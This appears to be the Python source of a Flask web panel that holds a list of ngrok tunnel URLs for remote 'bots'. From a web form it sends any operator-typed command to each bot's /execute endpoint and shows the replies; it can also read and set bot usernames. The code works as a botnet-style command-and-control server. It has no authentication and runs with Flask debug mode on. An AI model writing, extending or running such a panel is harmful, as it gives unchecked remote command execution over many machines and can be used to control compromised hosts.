from flask import Flask, render_template, request, jsonify
import requests
import os
import signal

app = Flask(__name__)

# Global variables
ngrok_urls = []
bot_username = "Unknown_user"  # Assign your bot's username here

# Function to get the username of a worker
def get_username(url):
    endpoint = f"{url}/get_username"
    try:
        response = requests.get(endpoint)
        response.raise_for_status()
        username = response.json().get('username', 'Unknown User')
        return username
    except requests.exceptions.RequestException as e:
        print(f"Failed to get username from {url}. Error: {e}")
        return None

# Function to update the worker's username
def update_username(url, bot_username):
    endpoint = f"{url}/update_username"
    try:
        response = requests.post(endpoint, json={'username': bot_username})
        response.raise_for_status()
        return response.json().get('message', 'No result received')
    except requests.exceptions.RequestException as e:
        return f"Failed to update username at {url}. Error: {e}"

# Function to send command to a worker
def send_command_to_worker(ngrok_url, command):
    endpoint = f"{ngrok_url}/execute"
    try:
        response = requests.post(endpoint, json={'command': command})
        response.raise_for_status()  
        return response.json().get('result', 'No result received')
    except requests.exceptions.RequestException as e:
        return f"Failed to send command to {ngrok_url}. Error: {e}"

# Home page
@app.route('/')
def index():
    return render_template('index.html')

# Endpoint to set ngrok URLs
@app.route('/set_ngrok', methods=['POST'])
def set_ngrok():
    global ngrok_urls
    ngrok_urls = request.form['ngrok_urls'].split(',')
    ngrok_urls = [url.strip() for url in ngrok_urls]  # Clean whitespace
    return jsonify(message="ngrok URLs updated successfully.")

# Endpoint to send command
@app.route('/send_command', methods=['POST'])
def send_command():
    global bot_username
    command = request.form['command']
    results = []

    if command.lower() == "update_username":
        for ngrok_url in ngrok_urls:
            current_username = get_username(ngrok_url)
            if current_username:
                bot_username = current_username  # Update the bot's username
                result = update_username(ngrok_url, bot_username)
                results.append(f"Response from {ngrok_url}: {result}")
    else:
        for ngrok_url in ngrok_urls:
            result = send_command_to_worker(ngrok_url, command)
            results.append(result)

    return jsonify(results=results)

# Route for the bots page
@app.route('/bots')
def bots():
    # Create a dictionary mapping each ngrok URL to its username
    bots = {url: get_username(url) for url in ngrok_urls}
    return render_template('bots.html', bots=bots)  # Pass the bots dictionary to the template

# Signal handler for graceful shutdown
def signal_handler(sig, frame):
    print("Exiting...")
    os._exit(0)

if __name__ == '__main__':
    signal.signal(signal.SIGINT, signal_handler)
    app.run(debug=True)
